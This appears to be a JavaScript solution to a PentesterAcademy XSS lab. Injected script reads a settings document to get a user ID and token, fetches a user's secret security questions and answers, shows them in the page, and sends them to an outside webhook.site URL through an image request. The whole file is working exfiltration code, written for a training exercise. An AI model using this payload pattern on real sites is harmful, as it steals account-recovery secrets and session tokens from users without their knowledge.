// https://pentesteracademylab.appspot.com/lab/webapp/jfp/21

// Objectives:
//     Find John's Secret Questions+Answers using an XSS vulnerability on this page
//     Display the Questions+Answers in the div with id "result"
//     Send the Questions+Answers to your Attack Server
//     No Hardcoded values can be used - everything has to be figured out dynamically


let api = document.getElementById('settings').href;

let req1 = new XMLHttpRequest();
req1.open('GET', api, true);
req1.send()

let req2 = new XMLHttpRequest();

req1.onreadystatechange = function (){
    if (this.readyState===4 && this.status===200){
        let resp = req1.responseXML;
        let uid = resp.getElementsByTagName('uid-param-value')[0].textContent;
        let token = resp.getElementsByTagName('token-param-value')[0].textContent;
        let endpoint = resp.getElementsByTagName('endpoint')[0].textContent;

        req2.open('GET', endpoint + '?uid=' + uid + '&token=' + token, true);
        req2.send();
    }
}


req2.onreadystatechange = function (){
    if (this.readyState===4 && this.status===200){
        let questions = JSON.parse(req2.responseText)

        document.getElementById('result').innerHTML = questions.q1 + '</br>' + questions.q2 + '</br>' +questions.q3 + '</br>';
        
        let img = new Image().src='https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57?q1=' + questions.q1 + '&q2=' + questions.q2 + '&q3=' + questions.q3;
    }
}

